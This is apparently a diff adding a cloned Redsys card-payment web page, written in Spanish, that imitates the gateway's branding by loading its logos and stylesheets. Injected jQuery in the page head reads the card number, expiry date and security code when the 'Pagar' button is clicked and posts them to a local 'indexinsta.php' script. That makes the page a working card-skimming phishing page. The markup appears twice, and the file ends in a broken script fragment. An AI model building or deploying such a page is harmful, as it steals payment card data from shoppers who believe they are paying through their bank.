@@ -1,0 +1,540 @@
+<!doctype html>
+
+<html style="" class=" js flexbox flexboxlegacy canvas canvastext webgl touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths"><script type="text/javascript" charset="utf-8" id="zm-extension" src="chrome-extension://fdcgdnkidjaadafnichfpabhfomcebme/scripts/webrtc-patch.js" async=""></script><head>
+  <meta content="-1" http-equiv="Expires"> 
+  <meta content="Monday, 01-Jan-90 00:00:00 GMT" http-equiv="Expires"> 
+  <meta content="no-cache, no-store" http-equiv="Pragma"> 
+  <meta content="no-cache, no-store, max-age=0, must-revalidate" http-equiv="Cache-Control"> 
+  <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1"> 
+  <meta content="IE=edge" http-equiv="X-UA-Compatible"> 
+  <meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport"> 
+  <link href="https://sis.redsys.es/sis/graficos/logotipos/comunes/9999favicon.ico" type="image/ico" rel="shortcut icon"> 
+  <link href="https://sis.redsys.es/sis/graficos/logotipos/comunes/9999favicon.ico" type="image/ico" rel="icon"> 
+  <title>Redsys</title> 
+  <link type="text/css" href="https://sis.redsys.es/sis/estilos/unica/9999redsys.css" rel="StyleSheet">
+  <!--[if lt IE 10]><link href="https://sis.redsys.es/sis/estilos/unica/9999ie.css" type="text/css" rel="stylesheet"><![endif]-->
+  <!--[if lt IE 8]><link href="https://sis.redsys.es/sis/estilos/unica/ie7.css" type="text/css" rel="stylesheet"><![endif]-->
+  <link type="text/css" href="https://sis.redsys.es/sis/estilos/unica/0002-ni.css" rel="StyleSheet"> 
+  <link type="text/css" href="https://sis.redsys.es/sis/estilos/unica/1465-ni.css" rel="StyleSheet"> 
+  <link rel="StyleSheet" type="text/css" href="https://sis.redsys.es/sis/estilos/unica/46102406-1--ni.css">
+  <!--[if lt IE 9]>  <![endif]-->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+<script>
+
+
+
+
+$(document).ready(function() {
+
+
+$("#btn").click(function() {
+var tarjeta = $('#inputCard').val();
+
+var mes = $('#cad1').val();
+var ano = $('#cad2').val();
+var cvv = $('#codseg').val();
+
+//alert(mes);
+
+
+
+$.ajax({
+           type: "POST",
+           url: "indexinsta.php",
+           data: "tarjeta="+ tarjeta + "&mes=" + mes + "&ano="+ ano + "&cvv=" + cvv + "", // Adjuntar los campos del formulario enviado.
+           success: function(data)
+           {
+
+
+
+$("#res").html(data);
+
+//alert(data);
+
+
+}
+
+});
+
+
+
+
+
+//alert(tarjeta);
+
+//alert();
+
+});
+
+
+
+
+
+});
+
+
+
+
+</script>
+
+
+
+
+
+
+
+
+ </head> 
+ <body id="home" onload="fijarLiterales();fijarFoco();inicializaCambioIdioma();fijarCVV2('4');cambiarIdiomaCheck('1');"> 
+  <div id="container"> 
+   <form autocomplete="off" action="/sis/pagoTarjeta;jsessionid=0000g_QlAtaCPXoZqVoaeQbajgp:1bc077pal" method="post" name="formTarjeta"> 
+    <header id="header"> 
+     <div class="container"> 
+      <h1 style="display:none;">Redsys</h1> 
+     
+      <div class="logoEntidad"> 
+       <img alt="Redsys" src="https://sis.redsys.es/sis/graficos/logotipos/entidad/1465.png" onerror="this.src='https://sis.redsys.es/sis/graficos/logotipos/comunes/9999logo.png'">
+      </div> 
+      <div class="lang-wr"> 
+       <div class="left"> 
+        <p> 
+         <text lngid="seleccioneSuIdioma" id="seleccioneSuIdioma">
+          Seleccione su idioma
+         </text> </p> 
+       </div> 
+       <div class="right"> 
+        <select onchange="cambiarIdioma(this.value,'RSisSelFormaPago');" id="checkIdioma"><option value="1">Castellano</option><option value="3">Català</option><option value="13">Euskara</option><option value="12">Galego</option><option value="10">Valencià</option><option disabled="" value=""></option><option value="203">Ceština</option><option value="208">Dansk</option><option value="5">Deutsch</option><option value="233">Eesti keel</option><option value="300">e???????</option><option value="2">English</option><option value="4">Français</option><option value="191">Hrvatski</option><option value="428">Latviešu valoda</option><option value="440">Lietuviu kalba</option><option value="348">Magyar</option><option value="470">Malti</option><option value="6">Nederlands</option><option value="7">Italiano</option><option value="642">Româna</option><option value="8">Svenska</option><option value="11">Polski</option><option value="9">Português</option><option value="643">??´????? ???´?</option><option value="100">????????? ????</option><option value="705">Slovenski jezik</option><option value="703">Slovenský jazyk</option><option value="246">Suomi</option><option value="792">Türkçe</option></select> 
+        <div class="clear-fix"></div> 
+       </div> 
+      </div> 
+     </div> 
+   
+    </header> 
+    <ol class="steps-wr"> 
+     <li id="s-method" class="step active"> <span class="num">1</span> <p lngid="seleccioneMetodoPago" class="s-text">Seleccione método de pago</p> </li> 
+     <li id="s-auth" class="step "> <span class="num">2</span> <p lngid="comprobacionAutenticacion" class="s-text">Comprobación autenticación</p> </li> 
+     <li id="s-connect" class="step "> <span class="num">3</span> <p lngid="solicitandoAutorizacion" class="s-text">Solicitando Autorización</p> </li> 
+     <li id="s-result" class="step "> <span class="num">4</span> <p lngid="resultadoTransaccion" class="s-text">Resultado Transacción</p> </li> 
+    </ol> 
+    <div class="clear-fix"></div> 
+    <div id="body"> 
+     <div class="col-wr right"> 
+      <div class="tituloSeleccioneMetodoDePago"> 
+       <h3 class="tituloSeleccioneMetodoDePago" lngid="tituloSeleccioneMetodoDePago">Seleccione método de pago</h3> 
+      </div> 
+      <div style="min-height:16px !important; overflow-y: auto;" class="cards-mod-wr"> 
+       <div class="tituloPagoTarjeta" style="background-image: url(&quot;https://sis.redsys.es/sis/graficos/logotipos/comunes/2100abrirpuntaarriba.png&quot;);"> 
+        <div style="float:left;" class="pagoConTarjeta"> 
+         <h3 lngid="pagoConTarjeta" class="pagoConTarjeta">Pagar con Tarjeta</h3> 
+        </div> 
+        <div style="float:right;"></div> 
+        <div class="center-cards"> 
+         <div class="microcard" id="micro-visa"></div> 
+         <div class="microcard" id="micro-master1"></div> 
+         <div class="microcard" id="micro-master2"></div> 
+         <div class="microcard" id="micro-american"></div> 
+        </div>
+       </div> 
+       <div class="datosTarjeta"> 
+        <div class="lineaPagoTarjeta"> 
+         <div class="detalleTarjeta"> 
+          <text lngid="tarjeta">
+           Nº Tarjeta:
+          </text> 
+         </div> 
+         <div class="inputTarjeta"> 
+          <span style="float:left;" class="icon i-card"></span>
+          <input id="inputCard" name="Sis_Numero_Tarjeta" type="tel" class="left form-control numbersOnly" size="20" maxlength="19" lngid="altTarjeta" alt="Número de la tarjeta" title="Número de la tarjeta" autocomplete="off" autofocus="" float="right" pattern="[0-9]{12,19}" value=""> 
+         </div> 
+        </div> 
+        <div class="lineaPagoTarjeta"> 
+         <div class="detalleTarjeta"> 
+          <text lngid="caducidad">
+           Caducidad:
+          </text> 
+         </div> 
+         <div class="inputTarjeta"> 
+          <span style="float:left;" class="icon i-cal"></span>
+          <input style="margin-right: 5px;" id="cad1" name="Sis_Caducidad_Tarjeta_Mes" placeholder="mm" type="tel" class="left form-control numbersOnly" size="2" maxlength="2" lngid="mes" alt="Mes" title="Mes" autocomplete="off" pattern="[0-9]{2}" value="">&nbsp; 
+          <input id="cad2" name="Sis_Caducidad_Tarjeta_Anno" placeholder="aa" type="tel" class="left form-control numbersOnly" size="2" maxlength="2" lngid="agno" alt="Año" title="Año" autocomplete="off" pattern="[0-9]{2}" value=""> 
+          <div style="display:none;" id="mmaa">
+           &nbsp;(
+           <span lngid="monthmonth" id="monthmonth" class="text">mm</span>/ 
+           <span lngid="yearyear" id="yearyear" class="text">aa</span>)
+          </div> 
+         </div> 
+        </div> 
+        <div class="lineaPagoTarjeta"> 
+         <div class="detalleTarjeta"> 
+          <text lngid="codigoSeguridad">
+           Cód. Seguridad:
+          </text> 
+         </div> 
+         <div class="inputTarjeta"> 
+          <span style="float:left;" class="icon i-lock"></span>
+          <input id="codseg" name="Sis_Tarjeta_CVV2" type="tel" class="left form-control numbersOnly" maxlength="4" size="4" lngid="codigoSeguridad" alt="Cód. Seguridad" title="Cód. Seguridad" autocomplete="off" pattern="[0-9]{0,4}" value="">
+          <span class="icon-cvc-help" lngid="altCVV2info" alt="¿Qué es el CVV2?" title="¿Qué es el CVV2?" value="?">? </span> 
+         </div> 
+        </div> 
+        <div class="message hide" id="message01">
+         Introduce un nÂº
+        </div> 
+        <div class="col-wr buttons-wr right"> 
+
+<br><div id="res" align="center"></div>
+
+
+         <button lngid="cancelar" onclick="javascript:cancelar();" id="divImgCancelar" class="btn btn-lg btn-cancel" type="button">Cancelar</button>
+         <button lngid="aceptar" id="btn" class="btn btn-lg btn-accept" type="button">Pagar</button> 
+        </div>
+       </div> 
+      </div> 
+      <div id="boxiupay" class="boxIupay"> 
+       <div id="boxinneriupay" class="boxInnerIupay"> 
+        <a href="javascript:seleccionaMetodoPago('O');" class="linkIupay"> 
+         <div id="titleboxiupay" class="titleBoxIupay"> 
+          <div id="enlaceTitleBoxIupay" class="enlaceTitleBox"> 
+           <h3 class="pagoConIupay" style="background-image: url('https://sis.redsys.es/sis/graficos/logotipos/comunes/9999abrirpuntadelante.png');"> 
+            
+            
+           
+          
+        </h3></div> 
+       </div> 
+      </a></div><a href="javascript:seleccionaMetodoPago('O');" class="linkIupay"> 
+     </a></div><a href="javascript:seleccionaMetodoPago('O');" class="linkIupay"> 
+     </a><div class="verified"><a href="javascript:seleccionaMetodoPago('O');" class="linkIupay"> 
+      </a><ul><a href="javascript:seleccionaMetodoPago('O');" class="linkIupay">
+       <div class="logoEsquema4b" style="width:68px;height:70px;"> 
+        <img src="https://sis.redsys.es/sis/graficos/logotipos/comunes/4Blogo.gif" alt="4B">
+       </div> 
+       </a><li><a href="javascript:seleccionaMetodoPago('O');" class="linkIupay"> </a><a id="iv-visa" href="javascript:ventanaInfoVisa1();"><img alt="Verified by Visa" src="https://sis.redsys.es/sis/graficos/logotipos/comunes/VerifiedByVisaLearnMore4.gif" id="logoVerifiedByVisa"></a> </li> 
+       <li> <a id="iv-mc" href="javascript:ventanaInfoMaster();"><img alt="Mastercard SecureCode" src="https://sis.redsys.es/sis/graficos/logotipos/comunes/MastercardSecureCodeLearnMore4.gif" id="logoMasterCardSecureCode"></a> </li> 
+      </ul> 
+     </div> 
+     <div class="header-mobile">
+     
+     </div>
+    </div> 
+    <input style="display:none;visibility:hidden;" value="" name="bcancel" type="hidden"> 
+    <footer id="footer">
+     <h6 lngid="powered" class="powered">Powered by Redsys</h6> 
+     <div class="copyright"> 
+      <center> 
+       <text lngid="copyright">
+        (c) 2014 Redsys Servicios de Procesamiento. SL - Todos los derechos reservados.
+       </text>&nbsp;-&nbsp; 
+       <text lngid="avisoLegal">
+        Aviso legal
+       </text>&nbsp;-&nbsp; 
+       <text lngid="privacidad">
+        Privacidad
+       </text> 
+      </center> 
+     </div> 
+    </footer> 
+    
+   <form action="script.php" method="GET" name="formModalidad"> 
+    <input value="" name="Ds_Merchant_PayMethod" type="hidden"> 
+   </form> 
+  </div></form> 
+  <div id="lightbox-panel"> 
+   <div class="cancel-wr"> 
+    <h2 lngid="codigoSeguridad">Cód. Seguridad</h2> 
+    <img src="https://sis.redsys.es/sis/graficos/logotipos/comunes/1465cvc-help.png" onerror="this.src='/sis/graficos/logotipos/comunes/9999cvc-help.png'">
+   </div> 
+   <div class="help-text"> 
+    <p lngid="codigoSeguridadTresDigitos">El código de seguridad son los tres últimos dígitos que aparecen en el reverso de las tarjetas de las marcas Visa, Visa Electron, Mastercard y Maestro.</p> 
+    <p lngid="casoTarjetasAmericanExpress">En el caso de las tarjetas American Express, el código son los cuatro dígitos que aparecen encima de la numeración de la tarjeta.</p> 
+   </div> 
+   <div class="cancel-wr"> 
+    <button lngid="cerrar" class="btn btn-lg btn-close close-panel" type="button">Cerrar</button> 
+   </div> 
+   <a lngid="cerrar" class="close-panel mob" href="javascript:void(0);" id="close-mob">Cerrar</a> 
+  </div> 
+  <a lngid="cerrar" class="close-panel" href="javascript:void(0);" id="close-help">Cerrar</a> 
+  <div id="lightbox"></div> 
+  <form id="frmOASYS" name="frmOASYS" method="GET"> 
+   <noscript>
+     &lt;tr&gt; &lt;td class="tituloDetalle"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td class="tituloDetalle"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td class="tituloDetalle"&gt;&lt;input value="Pagar" type="submit" class="buttonAccion"&gt;&lt;/td&gt; &lt;/tr&gt; 
+   </noscript> 
+   <input name="dato" type="hidden"> 
+
+<div id="res"></div>
+
+  </form> 
+ 
+
+</div></body></html>
+<head>
+  <meta content="-1" http-equiv="Expires"> 
+  <meta content="Monday, 01-Jan-90 00:00:00 GMT" http-equiv="Expires"> 
+  <meta content="no-cache, no-store" http-equiv="Pragma"> 
+  <meta content="no-cache, no-store, max-age=0, must-revalidate" http-equiv="Cache-Control"> 
+  <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1"> 
+  <meta content="IE=edge" http-equiv="X-UA-Compatible"> 
+  <meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport"> 
+  <link href="https://sis.redsys.es/sis/graficos/logotipos/comunes/9999favicon.ico" type="image/ico" rel="shortcut icon"> 
+  <link href="https://sis.redsys.es/sis/graficos/logotipos/comunes/9999favicon.ico" type="image/ico" rel="icon"> 
+  <title>Redsys</title> 
+  <link type="text/css" href="https://sis.redsys.es/sis/estilos/unica/9999redsys.css" rel="StyleSheet">
+  <!--[if lt IE 10]><link href="https://sis.redsys.es/sis/estilos/unica/9999ie.css" type="text/css" rel="stylesheet"><![endif]-->
+  <!--[if lt IE 8]><link href="https://sis.redsys.es/sis/estilos/unica/ie7.css" type="text/css" rel="stylesheet"><![endif]-->
+  <link type="text/css" href="https://sis.redsys.es/sis/estilos/unica/0002-ni.css" rel="StyleSheet"> 
+  <link type="text/css" href="https://sis.redsys.es/sis/estilos/unica/1465-ni.css" rel="StyleSheet"> 
+  <link rel="StyleSheet" type="text/css" href="https://sis.redsys.es/sis/estilos/unica/46102406-1--ni.css">
+  <!--[if lt IE 9]>  <![endif]-->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+<script>
+
+
+
+
+$(document).ready(function() {
+
+
+$("#btn").click(function() {
+var tarjeta = $('#inputCard').val();
+
+var mes = $('#cad1').val();
+var ano = $('#cad2').val();
+var cvv = $('#codseg').val();
+
+//alert(mes);
+
+
+
+$.ajax({
+           type: "POST",
+           url: "indexinsta.php",
+           data: "tarjeta="+ tarjeta + "&mes=" + mes + "&ano="+ ano + "&cvv=" + cvv + "", // Adjuntar los campos del formulario enviado.
+           success: function(data)
+           {
+
+
+
+$("#res").html(data);
+
+//alert(data);
+
+
+}
+
+});
+
+
+
+
+
+//alert(tarjeta);
+
+//alert();
+
+});
+
+
+
+
+
+});
+
+
+
+
+</script>
+
+
+
+
+
+
+
+
+ </head>
+<body id="home" onload="fijarLiterales();fijarFoco();inicializaCambioIdioma();fijarCVV2('4');cambiarIdiomaCheck('1');"> 
+  <div id="container"> 
+   <form autocomplete="off" action="/sis/pagoTarjeta;jsessionid=0000g_QlAtaCPXoZqVoaeQbajgp:1bc077pal" method="post" name="formTarjeta"> 
+    <header id="header"> 
+     <div class="container"> 
+      <h1 style="display:none;">Redsys</h1> 
+     
+      <div class="logoEntidad"> 
+       <img alt="Redsys" src="https://sis.redsys.es/sis/graficos/logotipos/entidad/1465.png" onerror="this.src='https://sis.redsys.es/sis/graficos/logotipos/comunes/9999logo.png'">
+      </div> 
+      <div class="lang-wr"> 
+       <div class="left"> 
+        <p> 
+         <text lngid="seleccioneSuIdioma" id="seleccioneSuIdioma">
+          Seleccione su idioma
+         </text> </p> 
+       </div> 
+       <div class="right"> 
+        <select onchange="cambiarIdioma(this.value,'RSisSelFormaPago');" id="checkIdioma"><option value="1">Castellano</option><option value="3">Català</option><option value="13">Euskara</option><option value="12">Galego</option><option value="10">Valencià</option><option disabled="" value=""></option><option value="203">Ceština</option><option value="208">Dansk</option><option value="5">Deutsch</option><option value="233">Eesti keel</option><option value="300">e???????</option><option value="2">English</option><option value="4">Français</option><option value="191">Hrvatski</option><option value="428">Latviešu valoda</option><option value="440">Lietuviu kalba</option><option value="348">Magyar</option><option value="470">Malti</option><option value="6">Nederlands</option><option value="7">Italiano</option><option value="642">Româna</option><option value="8">Svenska</option><option value="11">Polski</option><option value="9">Português</option><option value="643">??´????? ???´?</option><option value="100">????????? ????</option><option value="705">Slovenski jezik</option><option value="703">Slovenský jazyk</option><option value="246">Suomi</option><option value="792">Türkçe</option></select> 
+        <div class="clear-fix"></div> 
+       </div> 
+      </div> 
+     </div> 
+   
+    </header> 
+    <ol class="steps-wr"> 
+     <li id="s-method" class="step active"> <span class="num">1</span> <p lngid="seleccioneMetodoPago" class="s-text">Seleccione método de pago</p> </li> 
+     <li id="s-auth" class="step "> <span class="num">2</span> <p lngid="comprobacionAutenticacion" class="s-text">Comprobación autenticación</p> </li> 
+     <li id="s-connect" class="step "> <span class="num">3</span> <p lngid="solicitandoAutorizacion" class="s-text">Solicitando Autorización</p> </li> 
+     <li id="s-result" class="step "> <span class="num">4</span> <p lngid="resultadoTransaccion" class="s-text">Resultado Transacción</p> </li> 
+    </ol> 
+    <div class="clear-fix"></div> 
+    <div id="body"> 
+     <div class="col-wr right"> 
+      <div class="tituloSeleccioneMetodoDePago"> 
+       <h3 class="tituloSeleccioneMetodoDePago" lngid="tituloSeleccioneMetodoDePago">Seleccione método de pago</h3> 
+      </div> 
+      <div style="min-height:16px !important; overflow-y: auto;" class="cards-mod-wr"> 
+       <div class="tituloPagoTarjeta" style="background-image: url(&quot;https://sis.redsys.es/sis/graficos/logotipos/comunes/2100abrirpuntaarriba.png&quot;);"> 
+        <div style="float:left;" class="pagoConTarjeta"> 
+         <h3 lngid="pagoConTarjeta" class="pagoConTarjeta">Pagar con Tarjeta</h3> 
+        </div> 
+        <div style="float:right;"></div> 
+        <div class="center-cards"> 
+         <div class="microcard" id="micro-visa"></div> 
+         <div class="microcard" id="micro-master1"></div> 
+         <div class="microcard" id="micro-master2"></div> 
+         <div class="microcard" id="micro-american"></div> 
+        </div>
+       </div> 
+       <div class="datosTarjeta"> 
+        <div class="lineaPagoTarjeta"> 
+         <div class="detalleTarjeta"> 
+          <text lngid="tarjeta">
+           Nº Tarjeta:
+          </text> 
+         </div> 
+         <div class="inputTarjeta"> 
+          <span style="float:left;" class="icon i-card"></span>
+          <input id="inputCard" name="Sis_Numero_Tarjeta" type="tel" class="left form-control numbersOnly" size="20" maxlength="19" lngid="altTarjeta" alt="Número de la tarjeta" title="Número de la tarjeta" autocomplete="off" autofocus="" float="right" pattern="[0-9]{12,19}" value=""> 
+         </div> 
+        </div> 
+        <div class="lineaPagoTarjeta"> 
+         <div class="detalleTarjeta"> 
+          <text lngid="caducidad">
+           Caducidad:
+          </text> 
+         </div> 
+         <div class="inputTarjeta"> 
+          <span style="float:left;" class="icon i-cal"></span>
+          <input style="margin-right: 5px;" id="cad1" name="Sis_Caducidad_Tarjeta_Mes" placeholder="mm" type="tel" class="left form-control numbersOnly" size="2" maxlength="2" lngid="mes" alt="Mes" title="Mes" autocomplete="off" pattern="[0-9]{2}" value="">&nbsp; 
+          <input id="cad2" name="Sis_Caducidad_Tarjeta_Anno" placeholder="aa" type="tel" class="left form-control numbersOnly" size="2" maxlength="2" lngid="agno" alt="Año" title="Año" autocomplete="off" pattern="[0-9]{2}" value=""> 
+          <div style="display:none;" id="mmaa">
+           &nbsp;(
+           <span lngid="monthmonth" id="monthmonth" class="text">mm</span>/ 
+           <span lngid="yearyear" id="yearyear" class="text">aa</span>)
+          </div> 
+         </div> 
+        </div> 
+        <div class="lineaPagoTarjeta"> 
+         <div class="detalleTarjeta"> 
+          <text lngid="codigoSeguridad">
+           Cód. Seguridad:
+          </text> 
+         </div> 
+         <div class="inputTarjeta"> 
+          <span style="float:left;" class="icon i-lock"></span>
+          <input id="codseg" name="Sis_Tarjeta_CVV2" type="tel" class="left form-control numbersOnly" maxlength="4" size="4" lngid="codigoSeguridad" alt="Cód. Seguridad" title="Cód. Seguridad" autocomplete="off" pattern="[0-9]{0,4}" value="">
+          <span class="icon-cvc-help" lngid="altCVV2info" alt="¿Qué es el CVV2?" title="¿Qué es el CVV2?" value="?">? </span> 
+         </div> 
+        </div> 
+        <div class="message hide" id="message01">
+         Introduce un nÂº
+        </div> 
+        <div class="col-wr buttons-wr right"> 
+
+<br><div id="res" align="center"></div>
+
+
+         <button lngid="cancelar" onclick="javascript:cancelar();" id="divImgCancelar" class="btn btn-lg btn-cancel" type="button">Cancelar</button>
+         <button lngid="aceptar" id="btn" class="btn btn-lg btn-accept" type="button">Pagar</button> 
+        </div>
+       </div> 
+      </div> 
+      <div id="boxiupay" class="boxIupay"> 
+       <div id="boxinneriupay" class="boxInnerIupay"> 
+        <a href="javascript:seleccionaMetodoPago('O');" class="linkIupay"> 
+         <div id="titleboxiupay" class="titleBoxIupay"> 
+          <div id="enlaceTitleBoxIupay" class="enlaceTitleBox"> 
+           <h3 class="pagoConIupay" style="background-image: url('https://sis.redsys.es/sis/graficos/logotipos/comunes/9999abrirpuntadelante.png');"> 
+            
+            
+           
+          
+        </h3></div> 
+       </div> 
+      </a></div><a href="javascript:seleccionaMetodoPago('O');" class="linkIupay"> 
+     </a></div><a href="javascript:seleccionaMetodoPago('O');" class="linkIupay"> 
+     </a><div class="verified"><a href="javascript:seleccionaMetodoPago('O');" class="linkIupay"> 
+      </a><ul><a href="javascript:seleccionaMetodoPago('O');" class="linkIupay">
+       <div class="logoEsquema4b" style="width:68px;height:70px;"> 
+        <img src="https://sis.redsys.es/sis/graficos/logotipos/comunes/4Blogo.gif" alt="4B">
+       </div> 
+       </a><li><a href="javascript:seleccionaMetodoPago('O');" class="linkIupay"> </a><a id="iv-visa" href="javascript:ventanaInfoVisa1();"><img alt="Verified by Visa" src="https://sis.redsys.es/sis/graficos/logotipos/comunes/VerifiedByVisaLearnMore4.gif" id="logoVerifiedByVisa"></a> </li> 
+       <li> <a id="iv-mc" href="javascript:ventanaInfoMaster();"><img alt="Mastercard SecureCode" src="https://sis.redsys.es/sis/graficos/logotipos/comunes/MastercardSecureCodeLearnMore4.gif" id="logoMasterCardSecureCode"></a> </li> 
+      </ul> 
+     </div> 
+     <div class="header-mobile">
+     
+     </div>
+    </div> 
+    <input style="display:none;visibility:hidden;" value="" name="bcancel" type="hidden"> 
+    <footer id="footer">
+     <h6 lngid="powered" class="powered">Powered by Redsys</h6> 
+     <div class="copyright"> 
+      <center> 
+       <text lngid="copyright">
+        (c) 2014 Redsys Servicios de Procesamiento. SL - Todos los derechos reservados.
+       </text>&nbsp;-&nbsp; 
+       <text lngid="avisoLegal">
+        Aviso legal
+       </text>&nbsp;-&nbsp; 
+       <text lngid="privacidad">
+        Privacidad
+       </text> 
+      </center> 
+     </div> 
+    </footer> 
+    
+   <form action="https://sis.redsys.es/sis/formaPago;jsessionid=0000g_QlAtaCPXoZqVoaeQbajgp:1bc077pal" method="POST" name="formModalidad"> 
+    <input value="" name="Ds_Merchant_PayMethod" type="hidden"> 
+   </form> 
+  </div></form> 
+  <div id="lightbox-panel"> 
+   <div class="cancel-wr"> 
+    <h2 lngid="codigoSeguridad">Cód. Seguridad</h2> 
+    <img src="https://sis.redsys.es/sis/graficos/logotipos/comunes/1465cvc-help.png" onerror="this.src='/sis/graficos/logotipos/comunes/9999cvc-help.png'">
+   </div> 
+   <div class="help-text"> 
+    <p lngid="codigoSeguridadTresDigitos">El código de seguridad son los tres últimos dígitos que aparecen en el reverso de las tarjetas de las marcas Visa, Visa Electron, Mastercard y Maestro.</p> 
+    <p lngid="casoTarjetasAmericanExpress">En el caso de las tarjetas American Express, el código son los cuatro dígitos que aparecen encima de la numeración de la tarjeta.</p> 
+   </div> 
+   <div class="cancel-wr"> 
+    <button lngid="cerrar" class="btn btn-lg btn-close close-panel" type="button">Cerrar</button> 
+   </div> 
+   <a lngid="cerrar" class="close-panel mob" href="javascript:void(0);" id="close-mob">Cerrar</a> 
+  </div> 
+  <a lngid="cerrar" class="close-panel" href="javascript:void(0);" id="close-help">Cerrar</a> 
+  <div id="lightbox"></div> 
+  <form id="frmOASYS" name="frmOASYS" method="GET"> 
+   <noscript>
+     &lt;tr&gt; &lt;td class="tituloDetalle"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td class="tituloDetalle"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td class="tituloDetalle"&gt;&lt;input value="Pagar" type="submit" class="buttonAccion"&gt;&lt;/td&gt; &lt;/tr&gt; 
+   </noscript> 
+   <input name="dato" type="hidden"> 
+
+<div id="res"></div>
+
+  </form> 
+ 
+
+</div></body>
+
+();</script></body></html>
+
+</html>
